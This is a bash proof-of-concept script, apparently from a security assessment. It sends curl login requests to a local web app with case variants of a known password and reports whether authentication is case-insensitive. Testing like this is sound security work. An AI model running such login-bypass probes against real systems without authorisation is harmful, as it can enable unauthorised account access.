#!/bin/bash

# POC: Case-Insensitive Password Comparison Vulnerability
# This script demonstrates that the authentication mechanism accepts passwords
# with different case variations, significantly reducing password entropy.

TARGET="http://localhost:8080"
USERNAME="test"
CORRECT_PASSWORD="test"  # lowercase - the actual correct password

echo "========================================"
echo "Case-Insensitive Password Comparison POC"
echo "========================================"
echo ""
echo "Target: $TARGET"
echo "Username: $USERNAME"
echo "Correct password (lowercase): $CORRECT_PASSWORD"
echo ""

# Test 1: Correct password (lowercase)
echo "[TEST 1] Authenticating with correct password (lowercase): '$CORRECT_PASSWORD'"
RESPONSE1=$(curl -s -i -X POST "$TARGET/password/$USERNAME" \
  -d "username=$USERNAME&password=$CORRECT_PASSWORD" 2>&1)

if echo "$RESPONSE1" | grep -q "HTTP.*302\|HTTP.*200"; then
  STATUS1=$(echo "$RESPONSE1" | head -n 1)
  echo "Status: $STATUS1"
  if echo "$RESPONSE1" | grep -q "Set-Cookie.*auth_token\|Set-Cookie.*session"; then
    echo "Result: ✓ AUTHENTICATION SUCCESSFUL - Session cookie set"
    TEST1_PASS=true
  else
    echo "Result: ✗ AUTHENTICATION FAILED"
    TEST1_PASS=false
  fi
else
  echo "Result: ✗ Request failed"
  TEST1_PASS=false
fi
echo ""

# Test 2: Uppercase password
echo "[TEST 2] Authenticating with UPPERCASE password: 'TEST'"
RESPONSE2=$(curl -s -i -X POST "$TARGET/password/$USERNAME" \
  -d "username=$USERNAME&password=TEST" 2>&1)

if echo "$RESPONSE2" | grep -q "HTTP.*302\|HTTP.*200"; then
  STATUS2=$(echo "$RESPONSE2" | head -n 1)
  echo "Status: $STATUS2"
  if echo "$RESPONSE2" | grep -q "Set-Cookie.*auth_token\|Set-Cookie.*session"; then
    echo "Result: ✓ AUTHENTICATION SUCCESSFUL - Session cookie set"
    TEST2_PASS=true
  else
    echo "Result: ✗ AUTHENTICATION FAILED"
    TEST2_PASS=false
  fi
else
  echo "Result: ✗ Request failed"
  TEST2_PASS=false
fi
echo ""

# Test 3: Mixed case password
echo "[TEST 3] Authenticating with mixed case password: 'TeSt'"
RESPONSE3=$(curl -s -i -X POST "$TARGET/password/$USERNAME" \
  -d "username=$USERNAME&password=TeSt" 2>&1)

if echo "$RESPONSE3" | grep -q "HTTP.*302\|HTTP.*200"; then
  STATUS3=$(echo "$RESPONSE3" | head -n 1)
  echo "Status: $STATUS3"
  if echo "$RESPONSE3" | grep -q "Set-Cookie.*auth_token\|Set-Cookie.*session"; then
    echo "Result: ✓ AUTHENTICATION SUCCESSFUL - Session cookie set"
    TEST3_PASS=true
  else
    echo "Result: ✗ AUTHENTICATION FAILED"
    TEST3_PASS=false
  fi
else
  echo "Result: ✗ Request failed"
  TEST3_PASS=false
fi
echo ""

# Test 4: Another mixed case variation
echo "[TEST 4] Authenticating with mixed case password: 'tEsT'"
RESPONSE4=$(curl -s -i -X POST "$TARGET/password/$USERNAME" \
  -d "username=$USERNAME&password=tEsT" 2>&1)

if echo "$RESPONSE4" | grep -q "HTTP.*302\|HTTP.*200"; then
  STATUS4=$(echo "$RESPONSE4" | head -n 1)
  echo "Status: $STATUS4"
  if echo "$RESPONSE4" | grep -q "Set-Cookie.*auth_token\|Set-Cookie.*session"; then
    echo "Result: ✓ AUTHENTICATION SUCCESSFUL - Session cookie set"
    TEST4_PASS=true
  else
    echo "Result: ✗ AUTHENTICATION FAILED"
    TEST4_PASS=false
  fi
else
  echo "Result: ✗ Request failed"
  TEST4_PASS=false
fi
echo ""

# Summary
echo "========================================"
echo "VULNERABILITY SUMMARY"
echo "========================================"
PASS_COUNT=0
[ "$TEST1_PASS" = true ] && ((PASS_COUNT++))
[ "$TEST2_PASS" = true ] && ((PASS_COUNT++))
[ "$TEST3_PASS" = true ] && ((PASS_COUNT++))
[ "$TEST4_PASS" = true ] && ((PASS_COUNT++))

if [ "$TEST2_PASS" = true ] || [ "$TEST3_PASS" = true ] || [ "$TEST4_PASS" = true ]; then
  echo "VULNERABILITY CONFIRMED: Password comparison is case-insensitive"
  echo "Password variations accepted: $PASS_COUNT/4 tests passed"
  echo ""
  echo "Impact: Attackers can bypass authentication using case variations"
  echo "        of the actual password, significantly reducing password entropy."
  exit 0
else
  echo "VULNERABILITY NOT CONFIRMED"
  exit 1
fi